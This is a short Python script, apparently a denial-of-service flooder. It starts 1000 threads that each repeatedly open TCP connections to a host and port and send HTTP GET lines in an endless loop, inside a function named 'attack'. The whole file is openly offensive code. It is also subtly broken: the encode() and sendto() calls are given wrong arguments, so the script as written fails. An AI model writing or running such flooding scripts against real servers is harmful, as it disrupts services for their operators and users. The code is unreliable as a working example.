import socket
import threading

ip = '127.0.0.1'
port = 8000


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendto(('GET /' + ip + ' HTTP/1.1\r\n').encode('ascii', (ip, port)))


# start 1000 threads that call the same endpoint infinitly
for _ in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
